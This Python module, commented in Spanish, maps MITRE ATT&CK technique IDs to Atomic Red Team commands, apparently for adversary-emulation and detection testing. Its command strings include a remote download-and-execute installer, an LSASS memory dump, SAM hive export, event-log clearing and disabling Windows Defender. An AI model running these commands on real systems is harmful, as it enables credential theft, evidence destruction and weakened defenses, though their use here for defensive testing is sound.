"""
Comandos de Atomic Red Team para testing de técnicas MITRE ATT&CK
"""

ATOMIC_COMMANDS = {
    "T1053.005": {
        "install": """# Instalar Atomic Red Team
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """# Test: Scheduled Task Creation
Invoke-AtomicTest T1053.005""",
        "simple": """# Simple PowerShell test (sin Atomic Red Team)
schtasks /create /tn "AtomicTask" /tr "calc.exe" /sc once /st 23:59
schtasks /delete /tn "AtomicTask" /f"""
    },
    
    "T1136.001": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1136.001""",
        "simple": """# Create and delete local account
net user AtomicUser P@ssw0rd /add
net user AtomicUser /delete"""
    },
    
    "T1543.003": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1543.003""",
        "simple": """# Create test service
sc create AtomicTestService binPath= "C:\\Windows\\System32\\cmd.exe"
sc delete AtomicTestService"""
    },
    
    "T1070.001": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1070.001""",
        "simple": """# Clear event logs (CUIDADO - solo en ambiente de prueba!)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application"""
    },
    
    "T1003.001": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1003.001""",
        "simple": """# Attempt LSASS access (may trigger AV)
# ⚠️ SOLO EN AMBIENTE DE LABORATORIO
rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id $env:TEMP\\lsass.dmp full"""
    },
    
    "T1003.002": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1003.002""",
        "simple": """# Access SAM registry (requires admin)
reg save HKLM\\sam $env:TEMP\\sam.save
reg save HKLM\\system $env:TEMP\\system.save
del $env:TEMP\\sam.save
del $env:TEMP\\system.save"""
    },
    
    "T1110": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1110""",
        "simple": """# Simulate failed logon attempts
net use \\\\localhost\\IPC$ /user:testuser wrongpassword
net use \\\\localhost\\IPC$ /user:testuser wrongpassword2
net use \\\\localhost\\IPC$ /user:testuser wrongpassword3"""
    },
    
    "T1059.001": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1059.001""",
        "simple": """# Execute PowerShell command
powershell.exe -Command "Write-Host 'Atomic Red Team Test'"
powershell.exe -EncodedCommand "VwByAGkAdABlAC0ASABvAHMAdAAgACcAQQB0AG8AbQBpAGMAIABSAGUAZAAgAFQAZQBhAG0AIABUAGUAcwB0ACcA"""
    },
    
    "T1059.003": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1059.003""",
        "simple": """# Execute cmd commands
cmd.exe /c "echo Atomic Red Team Test"
cmd.exe /c "whoami && hostname"""
    },
    
    "T1021.001": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1021.001""",
        "simple": """# RDP connection test
# Verificar RDP habilitado
qwinsta
Get-NetTCPConnection -LocalPort 3389"""
    },
    
    "T1021.002": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1021.002""",
        "simple": """# SMB share access
net view \\\\localhost
net use \\\\localhost\\C$"""
    },
    
    "T1047": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1047""",
        "simple": """# WMI command execution
wmic process call create "calc.exe"
wmic process where name="calc.exe" delete"""
    },
    
    "T1486": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1486""",
        "simple": """# ⚠️ SIMULACIÓN SEGURA de ransomware (no cifra realmente)
# Crea archivo de prueba y simula acceso
echo "test" > $env:TEMP\\test_ransomware.txt
Get-Content $env:TEMP\\test_ransomware.txt
del $env:TEMP\\test_ransomware.txt"""
    },
    
    "T1087.001": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1087.001""",
        "simple": """# Local account enumeration
net user
Get-LocalUser"""
    },
    
    "T1087.002": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1087.002""",
        "simple": """# Domain account enumeration
net user /domain
Get-ADUser -Filter *"""
    },
    
    "T1069.001": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1069.001""",
        "simple": """# Local group enumeration
net localgroup
Get-LocalGroup"""
    },
    
    "T1055": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1055""",
        "simple": """# ⚠️ Requiere herramientas especializadas
# Usar Atomic Red Team para test completo
# Esta técnica es compleja y requiere código especializado"""
    },
    
    "T1078": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1078""",
        "simple": """# Test valid account logon
# Simula logon con credenciales válidas
# Requiere credenciales de prueba configuradas"""
    },
    
    "T1562.001": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1562.001""",
        "simple": """# ⚠️ SOLO EN LABORATORIO - Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableRealtimeMonitoring $false"""
    },
    
    "T1134": {
        "install": """IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": """Invoke-AtomicTest T1134""",
        "simple": """# Token manipulation (requiere privilegios)
# Usar Atomic Red Team para test seguro"""
    },
}


def get_atomic_command(technique_id: str) -> dict:
    """Obtiene los comandos de Atomic Red Team para una técnica"""
    if technique_id in ATOMIC_COMMANDS:
        return ATOMIC_COMMANDS[technique_id]
    
    # Comando genérico para técnicas sin mapeo específico
    return {
        "install": """# Instalar Atomic Red Team
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics""",
        "test": f"""# Ejecutar test para {technique_id}
Invoke-AtomicTest {technique_id}""",
        "simple": f"""# No hay comando simple disponible para {technique_id}
# Usar Atomic Red Team para el test completo"""
    }
